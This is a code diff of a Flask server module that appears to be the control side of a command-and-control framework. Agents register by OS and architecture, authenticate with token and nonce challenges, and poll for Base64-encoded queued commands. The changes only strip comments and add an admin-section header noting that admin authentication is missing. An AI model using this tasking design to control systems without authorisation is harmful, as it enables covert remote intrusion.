@@ -12,7 +12,6 @@ from core.crypto import generate_token, generate_nonce, base64_encode
 from config.settings import COOKIE_SECURE, COOKIE_HTTPONLY, COOKIE_SAMESITE
 from core.crypto import hash_challenge
 
-# Create agent manager instance
 agent_manager = AgentManager()
 
 def register_routes(app):
@@ -35,22 +34,17 @@ def register_routes(app):
                 logging.warning("Invalid check-in data")
                 return jsonify({"error": "Missing required fields"}), 400
             
-            # Register the agent
             agent = agent_manager.register_agent(aid, os_type, arch)
             
-            # Generate a token and nonce
             token = generate_token()
             server_nonce = generate_nonce()
             
-            # Store the authentication data
             agent.token = token
             agent.client_nonce = client_nonce
             agent.server_nonce = server_nonce
             
-            # Add to token lookup
             agent_manager.assign_token(aid, token)
             
-            # Initialize command queue if needed
             if not agent.command_queue:
                 commands = get_commands_for_os(os_type)
                 for cmd_group in commands:
@@ -58,7 +52,6 @@ def register_routes(app):
                         command = Command(cmd=cmd_data["cmd"], type=cmd_data["type"])
                         agent.command_queue.append(command)
             
-            # Create response with server challenge
             resp = {
                 'status': 'Success',
                 'timestamp': time.time(),
@@ -91,11 +84,9 @@ def register_routes(app):
             server_challenge = data.get('server_challenge')
             client_response = data.get('response')
             
-            # Validate the parameters
             if not client_nonce or not server_challenge:
                 return jsonify({"error": "Missing verification parameters"}), 400
             
-            # Find agent by token in cookie
             token = request.cookies.get('auth_token')
             if not token:
                 return jsonify({"error": "Missing auth token"}), 400
@@ -104,12 +95,10 @@ def register_routes(app):
             if not agent:
                 return jsonify({"error": "Invalid token"}), 400
             
-            # Verify the client nonce matches
             if agent.client_nonce != client_nonce:
                 logging.warning(f"Client nonce mismatch for agent {agent.aid}")
                 return jsonify({"error": "Verification failed"}), 400
             
-            # Verify the server challenge
             if agent.server_nonce != server_challenge:
                 logging.warning(f"Server challenge mismatch for agent {agent.aid}")
                 return jsonify({"error": "Verification failed"}), 400
@@ -147,33 +136,27 @@ def register_routes(app):
         Requires authentication via secure cookie
         """
         try:
-            # Get token from cookie
             token = request.cookies.get('auth_token')
             if not token:
                 logging.warning('Missing auth cookie')
                 return jsonify({"error": "Missing auth token"}), 400
             
-            # Get agent by token
             agent = agent_manager.get_agent_by_token(token)
             if not agent:
                 logging.warning('Invalid token access attempt')
                 return jsonify({"error": "Invalid token"}), 400
             
-            # Update last seen time
             agent.last_seen = time.time()
             logging.info(f"Agent aid={agent.aid} checked in at {agent.last_seen:.2f}")
             
-            # Get next command
             command = agent_manager.get_next_command(agent.aid)
             if command:
                 command_text = command.cmd
             else:
                 command_text = 'NOP'
             
-            # Encode the command using URL-safe Base64
             encoded_command = base64_encode(command_text)
             
-            # Create response
             response = {
                 "status": "active",
                 "timestamp": time.time(),
@@ -228,6 +211,10 @@ def register_routes(app):
             logging.error(f"Error processing command report: {e}")
             return jsonify({"error": "Invalid report format"}), 400
     
+
+
+# ---------------- ADMIN SECTION ------------------ #
+
 
 ################# add in auth mechanism to get to admin dashboard ####################
     @app.route('/admin/agents', methods=['GET'])
